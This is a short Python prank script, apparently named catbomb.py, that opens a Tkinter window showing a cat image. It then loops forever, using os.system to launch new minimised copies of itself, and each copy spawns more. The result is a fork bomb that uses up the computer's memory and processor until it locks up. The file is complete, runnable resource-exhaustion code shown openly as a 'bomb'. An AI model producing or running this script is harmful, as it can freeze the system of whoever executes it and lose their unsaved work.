import os
import tkinter as tk
import random as rand

class Cat:
    def __init__(self):
        self.root = root = tk.Tk()
        self.img = img = os.getcwd() + r"\cat.gif"
        
        print(img)
        photo_image = tk.PhotoImage(file=img)
        
        photo_img = photo_image

        h = rand.randint(0, 150)
        w = rand.randint(0, 200)

        root.wm_title('get CAT\'d')
        root.geometry('%dx%d+%d+%d' % (900, 600, w, h))
        label = tk.Label(root, image=photo_img)
        label.pack()

        root.mainloop()

Cat()
while True:
    os.system('start /MIN python.exe catbomb.py')
    Cat()